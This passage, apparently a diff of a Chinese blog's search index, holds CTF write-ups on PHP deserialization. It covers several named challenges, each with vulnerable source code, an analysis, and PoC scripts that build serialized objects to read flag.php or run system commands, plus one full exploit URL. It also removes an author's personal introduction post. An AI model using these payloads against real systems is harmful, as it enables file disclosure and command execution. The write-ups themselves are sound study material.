class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);</span><br><span class="line">    function gettime($func, $p) &#123;</span><br><span class="line">        $result = call_user_func($func, $p);</span><br><span class="line">        $a= gettype($result);</span><br><span class="line">        if ($a == &quot;string&quot;) &#123;</span><br><span class="line">            return $result;</span><br><span class="line">        &#125; else &#123;return &quot;&quot;;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    class Test &#123;</span><br><span class="line">        var $p = &quot;Y-m-d h:i:s a&quot;;</span><br><span class="line">        var $func = &quot;date&quot;;</span><br><span class="line">        function __destruct() &#123;</span><br><span class="line">            if ($this-&gt;func != &quot;&quot;) &#123;</span><br><span class="line">                echo gettime($this-&gt;func, $this-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $func = $_REQUEST[&quot;func&quot;];</span><br><span class="line">    $p = $_REQUEST[&quot;p&quot;];</span><br><span class="line"></span><br><span class="line">    if ($func != null) &#123;</span><br><span class="line">        $func = strtolower($func);</span><br><span class="line">        if (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">            echo gettime($func, $p);</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">            die(&quot;Hacker...&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure><p>最简单的，但是有一些弯弯绕绕</p><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><ol><li>页面接受两个POST传参：func p</li><li>call_user_func($func, $p)是敏感函数，其第一个参数是php函数名，第二个参数是函数的传参，其功能就是调用并执行函数</li><li>这确实可以执行函数，但是经过了严格的过滤，当然，file_get_contents和unserialize函数是可以使用的</li><li>原题通过file_get_contents阅读代码</li><li>改网页对func进行了过滤，但是没有对p，同时有一个调用了敏感函数入口gettime的Test类，所以可以手动执行unserialize函数，并构造poc链</li></ol><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Test &#123;</span><br><span class="line">var p;</span><br><span class="line">var func; //由于序列化后的对象没有了方法，所以那些多余的东西根本不用写根本不用写</span><br><span class="line">&#125;</span><br><span class="line">$a = new Test();</span><br><span class="line">$a-&gt;p = &quot;pwd&quot;;</span><br><span class="line">$a-&gt;func = &quot;system&quot;;</span><br><span class="line"></span><br><span class="line">echo serialize($a);</span><br><span class="line">//echo urlencode(serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>然后传参，func为unserialize，p为poc链，现在可以执行任意系统命令和代码了</p><h2 id="2020-网鼎杯-青龙组-Web-AreUSerialz"><a href="#2020-网鼎杯-青龙组-Web-AreUSerialz" class="headerlink" title="2020-网鼎杯-青龙组-Web-AreUSerialz"></a>2020-网鼎杯-青龙组-Web-AreUSerialz</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"> </span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"> </span><br><span class="line">class FileHandler &#123;</span><br><span class="line"> </span><br><span class="line">    protected $op;</span><br><span class="line">    protected $filename;</span><br><span class="line">    protected $content;</span><br><span class="line"> </span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        $op = &quot;1&quot;;</span><br><span class="line">        $filename = &quot;/tmp/tmpfile&quot;;</span><br><span class="line">        $content = &quot;Hello World!&quot;;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    public function process() &#123;</span><br><span class="line">        if($this-&gt;op == &quot;1&quot;) &#123;</span><br><span class="line">            $this-&gt;write();</span><br><span class="line">        &#125; else if($this-&gt;op == &quot;2&quot;) &#123;</span><br><span class="line">            $res = $this-&gt;read();</span><br><span class="line">            $this-&gt;output($res);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Bad Hacker!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    private function write() &#123;</span><br><span class="line">        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;</span><br><span class="line">            if(strlen((string)$this-&gt;content) &gt; 100) &#123;</span><br><span class="line">                $this-&gt;output(&quot;Too long!&quot;);</span><br><span class="line">                die();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents($this-&gt;filename, $this-&gt;content);</span><br><span class="line">            if($res) $this-&gt;output(&quot;Successful!&quot;);</span><br><span class="line">            else $this-&gt;output(&quot;Failed!&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Failed!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    private function read() &#123;</span><br><span class="line">        $res = &quot;&quot;;</span><br><span class="line">        if(isset($this-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents($this-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        return $res;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    private function output($s) &#123;</span><br><span class="line">        echo &quot;[Result]: &lt;br&gt;&quot;;</span><br><span class="line">        echo $s;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        if($this-&gt;op === &quot;2&quot;)</span><br><span class="line">            $this-&gt;op = &quot;1&quot;;</span><br><span class="line">        $this-&gt;content = &quot;&quot;;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">function is_valid($s) &#123;</span><br><span class="line">    for($i = 0; $i &lt; strlen($s); $i++)</span><br><span class="line">        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))</span><br><span class="line">            return false;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123;</span><br><span class="line"> </span><br><span class="line">    $str = (string)$_GET[&#x27;str&#x27;];</span><br><span class="line">    if(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="代码分析-1"><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h2><ol><li>接受一个传参str，进行is_valid过滤(这个过滤的意思就只是确保str里没有32-125之外的字符，鉴于我们传的东西没有那些字符，所以可以直接略过)</li><li>反序列化<code>$</code>str，并赋值给<code>$</code>obj</li><li>类FileHandler有三个成员变量，在序列化里，protected没多大用的</li><li>FileHandler在创建对象的时候会执行<code>__construct</code>，销毁对象时执行<code>__destruct</code>，两个方法都会调用process方法</li><li>process方法会调用write或read方法，这两个方法里有敏感函数，一个读文件一个写文件，我们这次只需要读；然后会调用output将read的返回输出</li><li>如果要构造poc链，那里面的op要为2，filename要为我们想要读取文件的文件名，当然就是include包含的flag.php</li></ol><h2 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a>poc</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class FileHandler &#123;</span><br><span class="line">    public $op;</span><br><span class="line">    public $filename;</span><br><span class="line">    public $content;</span><br><span class="line">&#125;</span><br><span class="line">$a = new FileHandler(); // 虽然__construct方法会修改op和filename</span><br><span class="line">$a-&gt;op=2;</span><br><span class="line">$a-&gt;filename=&quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">echo serialize($a);</span><br><span class="line">//echo urlencode(serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="浙江省大学生网络与信息安全竞赛-决赛-2019-Web-逆转思维"><a href="#浙江省大学生网络与信息安全竞赛-决赛-2019-Web-逆转思维" class="headerlink" title="浙江省大学生网络与信息安全竞赛-决赛-2019-Web-逆转思维"></a>浙江省大学生网络与信息安全竞赛-决赛-2019-Web-逆转思维</h2><h2 id="源码1"><a href="#源码1" class="headerlink" title="源码1"></a>源码1</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$text = $_GET[&quot;text&quot;];</span><br><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">$password = $_GET[&quot;password&quot;];</span><br><span class="line">if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))&#123;</span><br><span class="line">    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;</span><br><span class="line">    if(preg_match(&quot;/flag/&quot;,$file))&#123;</span><br><span class="line">        echo &quot;Not now!&quot;;</span><br><span class="line">        exit(); </span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        include($file);  //useless.php</span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        echo $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里用到了伪协议的知识，这与我们这篇浅记的主题无关，况且这是浅浅一记<br>只需要知道，通过data:&#x2F;&#x2F;伪协议传text绕过welcome to the zjctf，再file传php伪协议的任意文件读取读useless.php内容的base64，然后解码就能得到useless.php源代码</p><h2 id="源码2"><a href="#源码2" class="headerlink" title="源码2"></a>源码2</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"></span><br><span class="line">class Flag&#123;  //flag.php  </span><br><span class="line">    public $file;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;  </span><br></pre></td></tr></table></figure><p>这里可以真读取任意文件了，毕竟源码1过滤了file</p><h2 id="代码分析-2"><a href="#代码分析-2" class="headerlink" title="代码分析"></a>代码分析</h2><ol><li><code>__tostring</code>在所在对象被当作字符串时发动</li><li>敏感函数读取$file文件，然后输出</li><li>由于源码1 echo了反序列化的$password——当作字符串输出，所以这里就是突破口</li></ol><h2 id="poc链"><a href="#poc链" class="headerlink" title="poc链"></a>poc链</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Flag&#123;  </span><br><span class="line">    public $file;  </span><br><span class="line">&#125;  </span><br><span class="line">$a = new Flag();</span><br><span class="line">$a-&gt;file=&quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">echo serialize($a);</span><br><span class="line">//echo urlencode(serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>传入一下url</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure><p>ps:我想时常试用f12是一个好习惯</p><h2 id="2021-第五空间智能安全大赛-Web-pklovecloud"><a href="#2021-第五空间智能安全大赛-Web-pklovecloud" class="headerlink" title="2021-第五空间智能安全大赛-Web-pklovecloud"></a>2021-第五空间智能安全大赛-Web-pklovecloud</h2><h2 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">include &#x27;flag.php&#x27;;</span><br><span class="line">class pkshow </span><br><span class="line">&#123;  </span><br><span class="line">    function echo_name()     </span><br><span class="line">    &#123;          </span><br><span class="line">        return &quot;Pk very safe^.^&quot;;      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">class acp </span><br><span class="line">&#123;   </span><br><span class="line">    protected $cinder;  </span><br><span class="line">    public $neutron;</span><br><span class="line">    public $nova;</span><br><span class="line">    function __construct() </span><br><span class="line">    &#123;      </span><br><span class="line">        $this-&gt;cinder = new pkshow;</span><br><span class="line">    &#125;  </span><br><span class="line">    function __toString()      </span><br><span class="line">    &#123;          </span><br><span class="line">        if (isset($this-&gt;cinder))  </span><br><span class="line">            return $this-&gt;cinder-&gt;echo_name();      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">class ace</span><br><span class="line">&#123;    </span><br><span class="line">    public $filename;     </span><br><span class="line">    public $openstack;</span><br><span class="line">    public $docker; </span><br><span class="line">    function echo_name()      </span><br><span class="line">    &#123;   </span><br><span class="line">        $this-&gt;openstack = unserialize($this-&gt;docker);</span><br><span class="line">        $this-&gt;openstack-&gt;neutron = $heat;</span><br><span class="line">        if($this-&gt;openstack-&gt;neutron === $this-&gt;openstack-&gt;nova)</span><br><span class="line">        &#123;</span><br><span class="line">        $file = &quot;./&#123;$this-&gt;filename&#125;&quot;;</span><br><span class="line">            if (file_get_contents($file))         </span><br><span class="line">            &#123;              </span><br><span class="line">                return file_get_contents($file); </span><br><span class="line">            &#125;  </span><br><span class="line">            else </span><br><span class="line">            &#123; </span><br><span class="line">                return &quot;keystone lost~&quot;; </span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;pks&#x27;]))  </span><br><span class="line">&#123;</span><br><span class="line">    $logData = unserialize($_GET[&#x27;pks&#x27;]);</span><br><span class="line">    echo $logData; </span><br><span class="line">&#125; </span><br><span class="line">else </span><br><span class="line">&#123; </span><br><span class="line">    highlight_file(__file__); </span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="代码分析-3"><a href="#代码分析-3" class="headerlink" title="代码分析"></a>代码分析</h2><ol><li>反序列化pks，赋值给logData，然后输出</li><li>pkshow类没什么好说的</li><li>acp会首先将cinder构建为pkshow对象，然后调用里面的echo_name输出，我们不想要这个</li><li>ace的echo_name会反序列化成员变量docker，然后赋值给openstack</li><li>比较openstack里面的neutron和nova，看看是否值和类型都相等</li><li>相等就根据$filename读取文件</li><li>如果openstack没有neutron和nova，那么必然相等，即——虚无和虚无是等价的。毕竟$heat的值是不知道的。这意味着根本不用管docker和openstack</li></ol><h2 id="poc链条"><a href="#poc链条" class="headerlink" title="poc链条"></a>poc链条</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class ace&#123;</span><br><span class="line">    public $filename;     </span><br><span class="line">    public $openstack;</span><br><span class="line">    public $docker; </span><br><span class="line">&#125;</span><br><span class="line">clase acp&#123;</span><br><span class="line">    protected $cinder;  </span><br><span class="line">    public $neutron;</span><br><span class="line">    public $nova;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new acp();</span><br><span class="line">$a-&gt;cinder=new ace();</span><br><span class="line">$a-&gt;cinder-&gt;filename=&quot;flag.php&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol><li>反序列化蛮好玩的，当然学的话那是真的头痛</li><li>解决反序列化题目有一下几个要点<ol><li>得到源代码</li><li>魔术方法</li></ol></li><li>得到源代码需要其他web渗透和ctf技能的辅助，我的基础不太牢靠，需要对一下这几个方面进行补足：<ol><li>xss</li><li>csrf</li><li>ssrf</li><li>伪协议</li><li>文件上传、读取、包含webshell</li><li>SQL注入</li><li>其他</li></ol></li></ol>]]></content>
+      
+      
       <categories>
-        <category>网络安全</category>
-        <category>ctf</category>
+          
+          <category> 网络安全 </category>
+          
+          <category> ctf </category>
+          
       </categories>
-      <tags>
-        <tag>🌟🌟🌟🌟</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>hello_and_call_me_lord</title>
-    <url>/2023/10/21/old/hello-and-call-me-lord/</url>
-    <content><![CDATA[<h1 id="你好👋"><a href="#你好👋" class="headerlink" title="你好👋"></a>你好👋</h1><p><img src="/2023/10/21/old/hello-and-call-me-lord/%E8%BF%9C%E8%A7%86%E4%B8%BB%E4%B9%89%E6%97%97%E5%B8%9C.jpeg"></p>
-<h2 id="关于我的名字和这个教会"><a href="#关于我的名字和这个教会" class="headerlink" title="关于我的名字和这个教会"></a>关于我的名字和这个教会</h2><p>我是truthleader，也可以叫我真理教教主</p>
-<span id="more"></span>
-
-<p>我本来给自己设计的网名就是真理教教主，但是truthleader听上去更朗朗上口</p>
-<p>所以我用google翻译得到了truthleader，（很遗憾现在不是这样的翻法了）😭</p>
-<p>这是一个教会的官方网站，但是注意，这是一个私人的教会，我的意识是教会成员只有一个人，我兼任教主、圣战委员会常务委员长、自我教育局局长······</p>
-<p>总之，这个网站代表着我想要公之于众的自我内心世界，我的初心就是把我最真实的精神世界裸露出来，不论祂是否让人感到愉悦好玩、恶心厌恶————I don’t care a fuck</p>
-<h2 id="关于我"><a href="#关于我" class="headerlink" title="关于我"></a>关于我</h2><p>我学习的专业是信息安全，我将此看作我主要的经济来源，这是我的爱好</p>
-<p>我喜欢学习：哲学的、社会学的、科学的、政治的、心理的、生物的、医学的、地理的、计算机或者安全相关的——一切都是我想学的</p>
-<p>我希望别人对我的评价是：thinker</p>
-<h3 id="我的观念"><a href="#我的观念" class="headerlink" title="我的观念"></a>我的观念</h3><p>我将虚无主义预设为前提：</p>
-<ol>
-<li>目的本身是没目的的</li>
-<li>意义本身是没意义的</li>
-<li>存在是虚无的，但其存在是一个奇迹</li>
-<li>伦理道德是空虚之物</li>
-<li>不能用虚无为自己消极的态度做辩护，两者根本不接轨，想自杀的人因此而无顾忌，乐观向上的人因此而无拘束的乐于助人追求进步</li>
-<li>自杀是不对的，死亡是不对的，人的欲望不应把人摧毁，我的欲望不应把我摧毁，</li>
-</ol>
-<ul>
-<li><p>所谓的“我”是头脑生出的幻想，我所认为的那个“我”并不存在，本真的“我”是虚无的，所谓的自我意识是欲望集合体的某一个组织——调配欲望的优先满足顺序、计划欲望满足的机器</p>
-</li>
-<li><p>我把“求知欲”认定为我，我将禁欲的欲望当作枪来压制游戏的欲望和性的欲望，一切互相制衡分出高低，我把自己看作一个欲望代言人，欲望都想当我</p>
-</li>
-<li><p>求知欲是唯一变革自我观念、自我能力、自我的动力，我因此而行动生活，我不认为我的观念是真的、有价值的、可信的</p>
-</li>
-<li><p>我因为学习和头脑训练得出观念，我视其为求知欲想认识自己</p>
-</li>
-<li><p>我将欲望看作是第一性的，因而以此为基础来看待世界</p>
-</li>
-<li><p>对我来说，欲望的对象是具体的人和事，但欲望的目的是自我再生产，欲望通过快感实现再生产</p>
-</li>
-<li><p>快感是让人有愧疚感、罪恶感、兴奋感的上瘾之物</p>
-</li>
-<li><p>欲望的停止就是世界的死去</p>
-</li>
-<li><p>一切都是欲望的产物，包括欲望，例如：时间在前进、世界在涌现、现在带着过去奔向未来、有着“定律”的未来在把现实和过去牵引、资本为了再生产而支取肉身、变革者为了福祉、平等、幸福、理想而不断的前进、福祉本身的标准越来越高、科学越来越复杂强大、抖音越刷越想刷、游戏越玩越想玩</p>
-</li>
-<li><p>人不应该在欲望上让步，要不顾一切的让自己的欲望不断的再生产——保持生存、避免危险、享用美食、求取知识、爱另一半、尊老爱幼、尊敬师长、服从规矩</p>
-</li>
-<li><p>但欲望之间是互相冲突的，例如：想吃饭同时又想五谷轮回，总要先五谷轮回才能吃好饭，你是否想在五谷轮回的时候吃饭呢？有了一门赚钱的方式，但这触碰了良心，只有先检查良心去伪存真，然后才知道到底要不要这么做？</p>
-</li>
-<li><p>我只捍卫自己的欲望，别人怎么样与我无关，除非有欲望的牵扯，除非长远来看我真的确实就应该服软</p>
-</li>
-<li><p>罪犯有犯罪的能力，共同体的代表有抓捕的权利和义务</p>
-</li>
-</ul>
-<h1 id="关于这个网站和未来的展望"><a href="#关于这个网站和未来的展望" class="headerlink" title="关于这个网站和未来的展望"></a>关于这个网站和未来的展望</h1><h2 id="我必须承认，我什么都没准备好："><a href="#我必须承认，我什么都没准备好：" class="headerlink" title="我必须承认，我什么都没准备好："></a>我必须承认，我什么都没准备好：</h2><ol>
-<li>我没有关于这个网站的一个准确的定位，我不知道这个博客到底有什么价值——能让我使用时间去构筑和维护</li>
-<li>我没有设计这个网站的标签系统和分类系统，我想在博文的数量多一点之后再分类和贴标签</li>
-<li>我认为这个网站的美术和外观都是一坨💩，这个网站堪堪一用就被我上传上来了（说不定以后会改善，我可能会钻研css和js，我也可能会在github上找我喜欢的代码用到这里来）</li>
-</ol>
-<h2 id="同时我也要对自己争辩，这个网站还是很不错的："><a href="#同时我也要对自己争辩，这个网站还是很不错的：" class="headerlink" title="同时我也要对自己争辩，这个网站还是很不错的："></a>同时我也要对自己争辩，这个网站还是很不错的：</h2><ol>
-<li>我能通过这个来展示自己的能力，以后甚至可以写简介里</li>
-<li>我可以通过这个网站来吸引一些同好来交流，我将因此而得到提升</li>
-<li>我将通过对这个网站灌注心血来反向提升自我</li>
-</ol>
-<h2 id="然后，你可能会好奇，我会写些什么："><a href="#然后，你可能会好奇，我会写些什么：" class="headerlink" title="然后，你可能会好奇，我会写些什么："></a>然后，你可能会好奇，我会写些什么：</h2><ol>
-<li>CTF题目的writeup</li>
-<li>靶机的writeup</li>
-<li>漏洞的技术文档或学习笔记</li>
-<li>对安全事件的技术性反思</li>
-<li>对我的观念的阐述</li>
-<li>网安甚至其他内容的学习笔记</li>
-<li>读书笔记</li>
-</ol>
-<h2 id="我希望这个网站："><a href="#我希望这个网站：" class="headerlink" title="我希望这个网站："></a>我希望这个网站：</h2><ol>
-<li>能越来越有名气</li>
-<li>外观和美术越来越好看</li>
-<li>每个人能从中获益，从而找到好友</li>
-<li>能给我的就业和真实生活带了进步</li>
-<li>有一个完善的标签和分类体系</li>
-</ol>
-]]></content>
-  </entry>
+      
+      
+        <tags>
+            
+            <tag> 🌟🌟🌟🌟 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>hello_and_call_me_lord</title>
+      <link href="/2023/10/21/old/hello-and-call-me-lord/"/>
+      <url>/2023/10/21/old/hello-and-call-me-lord/</url>
+      
